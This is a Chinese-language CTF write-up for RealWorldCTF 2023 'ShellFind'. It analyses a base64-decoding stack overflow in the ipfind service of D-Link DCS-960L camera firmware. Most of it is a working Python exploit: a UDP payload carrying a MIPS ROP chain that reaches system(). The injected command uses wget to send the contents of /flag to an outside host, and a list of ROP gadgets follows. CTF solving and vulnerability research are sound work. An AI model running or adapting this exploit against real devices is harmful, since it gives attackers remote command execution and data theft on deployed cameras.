# rwctf2023 - ShellFind

## 目标程序寻找

binwlak解包后，会发现是dlink dcs-960l的固件。确定好其固件版本（DCS-960L_REVA_FIRMWARE_1.09.02.zip）后，去官方下载对应的原始固件。
http://legacyfiles.us.dlink.com/DCS-960L/REVA/FIRMWARE/

接着进行固件的diff。

```
Binary files ./_DCS-960L_A1_FW_1.09.02_20191128_r4588.bin.extracted/squashfs-root/usr/sbin/ipfind and ../_firmware.bin.extracted/squashfs-root/usr/sbin/ipfind differ
```
确定目标程序为ipfind

## 环境搭建

https://github.com/therealsaumil/emux
https://github.com/therealsaumil/emux/blob/master/docs/emulating-dlink-dcs935.md

可以使用emux，直接替换dcs935文件夹下的文件系统即可，比较的方便。

在系统启动完毕以后，手动执行一下：
`ipfind eth0&`

## 漏洞点

```C
int __fastcall sub_400F50(int a1, int a2)
{
  int v4; // $s1
  int v5; // $s0
  char *v6; // $a0
  int v7; // $v0
  char v9[256]; // [sp+18h] [-344h] BYREF
  char v10[256]; // [sp+118h] [-244h] BYREF
  char v11[256]; // [sp+218h] [-144h] BYREF
  char v12; // [sp+318h] [-44h] BYREF
  char v13[63]; // [sp+319h] [-43h] BYREF

  v12 = 0;
  memset(v13, 0, sizeof(v13));
  Base64decs(a1, v9);
  Base64decs(a2, v10);
  cfgRead("USER_ADMIN", "Username1", &v12);
  usrInit(0);
  v4 = usrGetGroup(v9);
  v5 = usrGetPass(v9, v11, 256);
  if ( v5 == 1 )
  {
    v6 = &v12;
    if ( !v4 )
    {
      v7 = strcmp(&v12, v9);
      v6 = v10;
      if ( !v7 )
        v5 = strcmp(v10, v11) != 0;
    }
  }
  else
  {
    v5 = -1;
  }
  usrFree(v6);
  return v5;
}
```

```C
_BYTE *__fastcall Base64dec(_BYTE *a1, _BYTE *a2)
{
  _BYTE *v2; // $s2
  _BYTE *v4; // $s0
  char *v5; // $a0
  int v6; // $v1
  int v7; // $v0
  int v8; // $a1
  int v9; // $a1
  char *v10; // $a2
  int v11; // $a0
  int i; // $v0
  char v13; // $a1
  char v15[16]; // [sp+18h] [-10h] BYREF

  v2 = a2;
  v4 = a2;
  while ( *a1 && *a1 != '=' )
  {
    memcpy(v15, &unk_E10, sizeof(v15));
    v5 = v15;
    v6 = 0;
    v7 = 0;
    do
    {
      v9 = (char)*a1;
      v10 = (char *)&unk_D10 + v9;
      if ( !*a1 )
        break;
      if ( v9 == '=' )
        break;
      v8 = *(_DWORD *)v5;
      ++v7;
      ++a1;
      v5 += 4;
      v6 |= *v10 << v8;
    }
    while ( v7 != 4 );
    v11 = v7 - 1;
    for ( i = 0; ; ++i )
    {
      v13 = 2 - i;
      if ( i >= v11 )
        break;
      *v4++ = v6 >> (8 * v13);
    }
  }
  *v4 = 0;
  return (_BYTE *)(v4 - v2);
}
```
在sub_400F50函数中，获取数据包中的账号密码进行base64的解码（Base64dec函数），在该过程中，未做较多的校验，导致了栈溢出。

## 漏洞利用

rop gadget 可以使用ropper，mipsrop等工具寻找，接着顺着这些gadget，往上再多看几条汇编，会发现一些比较有用的指令。

比赛时，只实现到了system(cmd)，本地成功，但远程虚拟机环境有不出网的限制，没有往下解决了...

### POC
```python
import socket
from pwn import *
import base64

context.endian = "big"
context.log_level = "debug"

def get_hwaddr(port,payload,ip):
    byte_message = bytes(payload)
    print(byte_message)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    print(payload)
    s.sendto(byte_message, (ip, int(port)))
    data, server = s.recvfrom(4096)
    print('received {!r}'.format(data))
    print(hexdump(data))
    hwaddr = data[0x11:0x11+6]
    # print('received {!r}'.format(hwaddr))
    print(hexdump(hwaddr))
    s.close()
    return hwaddr
    
    
def attack(port,payload,ip):
    print("att")
    byte_message = bytes(payload)
    print(byte_message)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    print(payload)
    s.sendto(byte_message, (ip, int(port)))
    data, server = s.recvfrom(4096)
    print('received {!r}'.format(data))
    print(hexdump(data))
    s.close()

#ip = '47.89.210.186'
#port = 30527

ip = '192.168.100.2'
port = 62720

payload = b'FIVI' + b"\x11\x22\x33\x44" +   p32(0x0a01000a)+ cyclic(5) + p32(0xffffffff) + p16(0xffff)
hwaddr= get_hwaddr(port,payload,ip)

# 00000000  52 54 00 12  34 56                                  │RT··│4V│

hwaddr = hwaddr[1:] + hwaddr[:1]


payload = b'FIVI' + b"\x11\x22\x33\x44" + p32(0x0a02000a) +  hwaddr * 2 + b"\x00\x8e" + b'\x00\x00' + b'\x00' + b"MTExMQo=" + b"\x01"*56 + base64.b64encode(cyclic(61) +p32(0x004016DC)+cyclic(588-61-4) + p32(0x004016DC)+p32(0xdeadbeef)*4 + p32(0x41b030) + cyclic(64-8) + p32(0)*2+p32(0x004016DC) + 24*b"b" + p32(0x41B030) + 56*b"c" + p32(0x0040104C) + 16*b"d" + p32(0x41b0a8) +cyclic(0x11c-64-4-28-60-20)) 


cmd = b"`wget http://192.168.100.1:8888/$(cat /flag)`"

payload = payload + cmd

attack(port,payload,ip)


'''
some useful gadgets
0x00400c9c: lw $gp, 0x10($sp); lw $ra, 0x1c($sp); jr $ra; addiu $sp, $sp, 0x20; 

# 0x00400e40: addiu $sp, $sp, 0x20; lw $ra, 0x1c($sp); jr $ra; addiu $sp, $sp, 0x20;

# 0x00400f3c: addiu $a1, $s0, 0x11; lw $ra, 0x24($sp); lw $s0, 0x20($sp); jr $ra; addiu $sp, $sp, 0x28;

# 0x00400fdc: addiu $a2, $sp, 0x318; lw $gp, 0x10($sp); lw $t9, -0x7fa8($gp); jalr $t9; move $a0, $zero;
# 0x00401254: addiu $gp, $gp, -0x4fd0; sw $gp, 0x10($sp); addiu $s1, $sp, 0x20; lw $t9, -0x7f10($gp); jalr $t9; move $a0, $s1;

# 0x004027d0: addiu $s0, $s0, -4; lw $ra, 0x24($sp); lw $s1, 0x20($sp); lw $s0, 0x1c($sp); jr $ra; addiu $sp, $sp, 0x28;

text:004027C0                 jalr    $t9
.text:004027C4                 nop
.text:004027C8
.text:004027C8 loc_4027C8:                              # CODE XREF: sub_402790+28↑j
.text:004027C8                 lw      $t9, 0($s0)
.text:004027CC                 bne     $t9, $s1, loc_4027C0
.text:004027D0                 addiu   $s0, -4
.text:004027D4                 lw      $ra, 0x1C+var_s8($sp)
.text:004027D8                 lw      $s1, 0x1C+var_s4($sp)
.text:004027DC                 lw      $s0, 0x1C+var_s0($sp)
.text:004027E0                 jr      $ra
.text:004027E4                 addiu   $sp, 0x28

# 0x00401108: addiu $v1, $zero, -1; movn $v1, $zero, $v0; move $v0, $v1; lw $ra, 0x24($sp); jr $ra; addiu $sp, $sp, 0x28;
# 0x004013e0: addiu $v0, $sp, 0x14; sw $v0, 8($sp); addiu $sp, $sp, 0x10; jr $ra; nop;

# 0×00401114: lw $ra, 0x24($sp) : jr $ra addiu $sp, $sp, 0x28

# 0x004010b0 : addiu $a0, $zero, 4 ; lw $ra, 0x1c($sp) ; jr $ra ; addiu $sp, $sp, 0x20

# 0x00401224 : move $a0, $s0 ; move $v0, $zero ; lw $ra, 0xa4($sp) ; lw $s1, 0xa0($sp) ; lw $s0, 0x9c($sp) ; jr $ra ; addiu $sp, $sp, 0xa8

# 0x004020b0: move $a0, $s0; lw $ra, 0x84($sp); lw $s1, 0x80($sp); lw $s0, 0x7c($sp); jr $ra; addiu $sp, $sp, 0x88;

# 0x00401228 : move $v0, $zero ; lw $ra, 0xa4($sp) ; lw $s1, 0xa0($sp) ; lw $s0, 0x9c($sp) ; jr $ra ; addiu $sp, $sp, 0x88

# text:00401054                 addiu   $a0, $sp, 0x35C+var_244  # s1
# .text:00401058  # 28:         v5 = strcmp(v10, v11) != 0;
# .text:00401058                 la      $t9, strcmp
# .text:0040105C                 jalr    $t9 ; strcmp
# .text:00401060                 addiu   $a1, $sp, 0x35C+var_144  # s2
# .text:00401064                 lw      $gp, 0x35C+var_34C($sp)
# .text:00401068                 sltu    $s0, $zero, $v0
# .text:0040106C  # 35:   usrFree(v6);o


#                 la      $a0, aFromSChangeIpS  # "from %s: Change IP %s.\n"
# .text:004016E4                 jal     sub_4013D0
# .text:004016E8                 move    $a1, $s1
# .text:004016EC                 lw      $gp, 0x48+var_30($sp)
# .text:004016F0                 bnez    $s2, loc_401714
# .text:004016F4                 lui     $a0, 0x40  # '@'
# .text:004016F8                 la      $t9, system
# .text:004016FC                 jalr    $t9 ; system
# .text:00401700                 la      $a0, command     # "/sbin/reboot&"
# .text:00401704                 b       loc_401714
# .text:00401708                 nop
# .text:0040170C  # ---------------------------------------------------------------------------
# .text:0040170C
# .text:0040170C loc_40170C:                              # CODE XREF: sub_4013F4+20C↑j
# .text:0040170C                 b       loc_401634
# .text:00401710                 li      $s2, 0xFFFFFFFF
# .text:00401714  # ---------------------------------------------------------------------------
# .text:00401714
# .text:00401714 loc_401714:                              # CODE XREF: sub_4013F4+2FC↑j
# .text:00401714                                          # sub_4013F4+310↑j
# .text:00401714                 lw      $ra, 0x48+var_sC($sp)
# .text:00401718                 lw      $s2, 0x48+var_s8($sp)
# .text:0040171C                 lw      $s1, 0x48+var_s4($sp)
# .text:00401720                 lw      $s0, 0x48+var_s0($sp)
# .text:00401724                 jr      $ra
# .text:00401728                 addiu   $sp, 0x58
'''
```

